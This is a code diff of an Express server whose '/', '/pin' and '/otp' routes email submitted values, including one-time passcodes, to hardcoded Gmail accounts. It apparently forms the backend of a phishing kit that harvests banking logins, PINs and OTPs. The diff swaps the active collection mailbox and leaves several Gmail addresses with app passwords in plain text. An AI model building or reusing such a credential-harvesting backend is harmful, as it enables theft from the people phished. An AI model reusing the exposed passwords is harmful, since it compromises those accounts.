@@ -20,10 +20,10 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      user: "edehchinedu59@gmail.com",
+      pass: "yknycyzsxdkxpepq",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
       // user: 'Victorchinemerem191@gmail.com',
       // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
@@ -58,10 +58,10 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      user: "edehchinedu59@gmail.com",
+      pass: "yknycyzsxdkxpepq",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
       // user: 'Victorchinemerem191@gmail.com',
       // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
@@ -96,23 +96,17 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "edehchinedu59@gmail.com",
+      pass: "yknycyzsxdkxpepq",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
-    subject: `OTP: ${req.body?.otp}`,
+    to: "edehchinedu59@gmail.com",
+    subject: `OTP: ${req.body?.otp} `,
   };
 
   console.log(mailOptions);
